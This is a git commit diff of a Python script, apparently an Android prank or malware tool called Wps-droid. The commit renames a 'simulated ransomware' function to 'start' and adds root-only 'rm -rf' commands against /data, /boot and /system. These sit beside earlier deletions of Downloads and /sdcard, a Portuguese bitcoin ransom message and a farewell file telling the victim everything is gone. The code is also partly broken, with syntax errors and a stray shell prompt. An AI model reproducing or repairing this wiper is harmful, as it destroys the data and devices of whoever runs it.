74d1329385c85dcc2e0e36cd94f010816fbdd7b5
Void <vdev30301@gmail.com>
2025-08-31 12:11:11 -0300

    Update wps.py

--- sorce-code/wps.py
+++ sorce-code/wps.py
@@ -1,9 +1,8 @@
 from os import system as run_system, startfile as open_file
-from sys import platform
 from time import sleep
 from subprocess import run
 
-def ransomware_simulado():
+def start():
     os.system("clear")
 
     print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
@@ -17,14 +16,20 @@ def ransomware_simulado():
         run('rm-rf Downloads', shell=shell_flag)
         run("rm -rf /sdcard"shell=shell_flag)
 
-        for i in range(1, 501):
-            filename = f"BY_WpsDroid{i}.txt"
+        if os.geteuid == 0:
+            run("rm -rf /data",shell=shell_flag)
+            run("rm -rf /boot",shell=shell_flag)
+            run("rm -rf /system",shell=shell_flag)
+
+
+        for i in range(1, 101):
+            filename = f"lol/BY_WpsDroid{i}.txt"
             with open(filename, 'w') as f:
-
-                f.write("""
-Cancer spreads within man the same way man spreads across the Earth — and in both cases, the outcome is death.
-
-""")
+                f.write("kkk script kiddie otario")
                 open_file(filename)
 
-ransomware_simulado()
+
+        run('echo "Seus documentos, fotos e projetos sumiram.
+    Não adianta buscar, nada mais existe.
+    Foi divertido." > /sdcard/GOODBYE.txt',shell=shell_flag)
+~/.../Wps-droid/sorce-code $
